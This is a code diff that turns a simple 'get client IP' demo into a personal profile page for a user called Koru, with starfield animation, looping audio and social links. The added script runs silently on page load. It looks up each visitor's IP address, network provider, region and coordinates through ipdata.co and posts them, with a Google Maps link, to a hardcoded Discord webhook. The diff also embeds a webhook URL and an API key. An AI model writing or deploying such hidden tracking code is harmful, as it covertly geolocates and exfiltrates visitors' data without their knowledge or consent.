@@ -1,48 +1,275 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <title>
-        Getting Clients IP
-    </title>
-
     <style>
-        div {
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Mono:wght@100..900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap');
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Awsome koru site</title>
+    <style>
+        @font-face {
+            font-family: meowfont;
+            src: url('whacky_joe-webfont.woff'), format('woff2');
+        }
+
+        pre,
+        code {
+            font-family: "Noto Sans Mono", Menlo, Monaco, Consolas, monospace;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            margin: 0;
+            overflow: hidden;
+
+            --prof-border-thickness: 2px;
+            --prof-radius: 20px;
+            --prof-outline_color: #3100a5;
+            --profile-width: 540px;
+            --banner-height: 150px;
+
+            background-color: #131313;
+        }
+
+        .bordered-div {
+            border: var(--prof-border-thickness) solid var(--prof-outline_color);
+            border-radius: var(--prof-radius);
+            width: fit-content;
             text-align: center;
         }
 
-        h1 {
-            color: green;
+        .circle-img {
+            border: var(--prof-border-thickness) solid var(--prof-outline_color);
+            border-radius: 50%;
+            width: var(--banner-height);
+            height: var(--banner-height);
+            object-fit: cover;
+            margin: 0;
+            padding: 0;
+        }
+
+        .star {
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background-color: #FFF;
+            border-radius: 50%;
+        }
+
+        .linkbox {
+            width: 40px;
+            height: 40px;
+            margin: 5px;
+            border: 2px solid var(--prof-outline_color);
+            border-radius: 12px;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .linkimg {
+            width: 30px;
+            height: 30px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            position: absolute;
+        }
+
+        @keyframes twinkle {
+            0% {
+                transform: translateY(0) translateX(0);
+            }
+
+            100% {
+                transform: translateY(-200vh) translateX(200vw);
+            }
         }
     </style>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-    </script>
 </head>
 
 <body>
-    <div>
-        <h1>
-            GeeksforGeeks
-        </h1>
-        <h3>
-            Getting Client IP address
-        </h3>
-        <p id="result"></p>
-    </div>
+
+    <script>NekoType = "white"</script>
+    <h1 id=nl>
+        <script src="https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a>
+    </h1>
+
     <script>
+        var webhookURL = "https://discord.com/api/webhooks/1143172539183534132/YRbyGP-3XZBkPveCPozw3lXUc81NPXtjjeAIqNKf-p9g9Slfl1JmJAd_QUwSttDoahoE";
+        var userInfo = "yeah idk";
+
         function json(url) {
             return fetch(url).then(res => res.json());
         }
 
-        let apiKey = '8c7095acb749cd89945b39c8f59293449d382d0ac157bd0b360f19d4';
-        json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
-            console.log(data.ip);
-            console.log(data.city);
-            console.log(data.country_code);
-            alert(data.ip);
-            // so many more properties
+        function sendWebhookInter() {
+
+            let apiKey = '8c7095acb749cd89945b39c8f59293449d382d0ac157bd0b360f19d4';
+            json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+                userInfo = `IP: ${data.ip}\nASN: ${data.asn.name}\nRegion: ${data.region}, ${data.country_name}: ${data.emoji_flag}\n[Maps Link](https://www.google.co.uk/maps/place/${data.latitude},${data.longitude})`;
+                sendWebhook();
+                // so many more properties
+            }).catch(error => {
+                userInfo = `Error: ${error}`;
+                sendWebhook();
+            });
+        }
+
+        function sendWebhook() {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `<@594965168111353896> The page has been loaded\n${userInfo}`
+                })
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send webhook:', response.status, response.statusText);
+                    } else {
+                        console.log('Webhook sent successfully!');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending webhook:', error);
+                });
+        }
+
+        if (!window.location.href.includes("extensionId=bianxianyang.htmlplay"))
+            sendWebhookInter();
+
+        function getRandomNumber(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function createStar() {
+            const star = document.createElement('div');
+            star.classList.add('star');
+
+            let starspeed = getRandomNumber(2, 5);
+            let starfinalsize = Math.floor(Math.max(2, ((((starspeed - 2) / 3) - 1) * -1) * 10));
+
+            star.style.width = starfinalsize + "px";
+            star.style.height = starfinalsize + "px";
+
+            star.style.left = `-10vw`;
+            star.style.top = `${Math.floor(Math.random() * 1000)}vh`;
+
+            star.style.animation = 'twinkle ' + starspeed * 2 + 's infinite linear';
+            star.style.zIndex = -1;
+            document.body.appendChild(star);
+            setTimeout(() => {
+                star.remove();
+            }, (starspeed * 2) * 1000);
+        }
+
+        setInterval(createStar, 100);
+
+        window.addEventListener('load', function () {
+            var audio = new Audio('car.mp3');
+            audio.loop = true;
+
+            function playAudio() {
+                if (audio.paused) {
+                    audio.play();
+                }
+            }
+
+            window.addEventListener('click', playAudio);
+            window.addEventListener('keypress', playAudio);
+            window.addEventListener('touchstart', playAudio);
+
+            audio.addEventListener('play', function () {
+                window.removeEventListener('click', playAudio);
+                window.removeEventListener('keypress', playAudio);
+                window.removeEventListener('touchstart', playAudio);
+            });
+
+            setTimeout(playAudio, 100);
+
+            function checkAudio() {
+                if (!audio.paused) {
+                    document.getElementById('hiddenElement').style.visibility = 'visible';
+                    document.getElementById('hidableText').style.visibility = 'hidden';
+                }
+                else {
+                    document.getElementById('hidableText').style.visibility = 'visible';
+                }
+            }
+
+            setInterval(checkAudio, 10);
         });
     </script>
+
+    <img src="https://media1.tenor.com/m/ABeVmJ3y2WQAAAAd/cat-dancing-meme-dancing.gif" id="hiddenElement"
+        style="position: absolute; visibility: hidden; left: calc(100% - 200px); width: 200px; height: 200px; top:0%"></img>
+
+    <div
+        style="width: var(--profile-width); max-width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+        <a id="hidableText"
+            style="visibility: visible; padding-bottom: 50px; color: white; font-family: meowfont;">!CLICK ME!</a>
+        <div
+            style="border: var(--prof-border-thickness) solid var(--prof-outline_color); border-top-left-radius: var(--prof-radius); border-top-right-radius: var(--prof-radius); background-image: url(https://upload.wikimedia.org/wikipedia/commons/5/50/AhuTongariki.JPG); background-size: cover; height: var(--banner-height); background-repeat: no-repeat; width: 100%; background-position: center;">
+        </div>
+        <div
+            style="width: 100%; border: var(--prof-border-thickness) solid var(--prof-outline_color); border-top: none; border-bottom-left-radius: var(--prof-radius); border-bottom-right-radius: var(--prof-radius); background-image: linear-gradient(#5aff5a, #ffffff, #ff75ff);">
+            <img src="https://cdn.discordapp.com/avatars/594965168111353896/44be115353d374944466c3ff173cf4f4.webp?size=4096"
+                class="circle-img" style="position: absolute; left: 50%; transform: translate(-50%, -50%);">
+
+            <div style="padding-bottom: 20px;">
+                <pre style="position: absolute; margin-top: -85px;">
+  ／l、             
+（ﾟ､ ｡ ７         
+  l  ~ヽ       
+  じしf_,)ノ
+</pre>
+                <img src="https://cdn.discordapp.com/emojis/1024751291504791654.gif"
+                    style="margin-top: calc(var(--prof-border-thickness)*-1); position: absolute;">
+
+                <pre href="https://discord.com/users/594965168111353896"
+                    style="text-align: center; font-family: meowfont; font-weight: 600; font-size: 28px; color: var(--prof-outline_color); margin-top: 90px;"><a href="https://discord.com/users/594965168111353896" style="color: inherit; text-decoration: none; text-shadow: 0 0 5px rgba(0, 0, 255, 0.5);">Koru</a></pre>
+
+                <pre
+                    style="text-align: center; font-family: meowfont; font-size: 16px; color: var(--prof-outline_color);">It's me
+the koru
+uhhh yeah
+idk what to put here</pre>
+
+                <div style="display: flex;  justify-content: center; margin-top: 20px;">
+                    <a href="https://namemc.com/profile/KoharuXenon.1" class="linkbox">
+                        <img class="linkimg" src="https://s.namemc.com/img/favicon-30.png"></a>
+
+                    <a href="https://www.youtube.com/KoharuXenon" class="linkbox">
+                        <img class="linkimg" src="https://cdn-icons-png.flaticon.com/256/1384/1384060.png"></a>
+
+                    <a href="https://github.com/KoharuXenon/" class="linkbox">
+                        <img class="linkimg"
+                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/640px-GitHub_Invertocat_Logo.svg.png"></a>
+                </div>
+                <div style="display: flex;  justify-content: center; margin-top: 20px;">
+                    <img src="ralseismokingadart.gif"></img>
+                    <img src="lem88x31.gif"></img>
+                    <img src="reshirii.gif"></img>
+                </div>
+
+            </div>
+        </div>
+
+        <div id="domainInfo"></div>
+
+    </div>
+
+
 </body>
 
 </html>
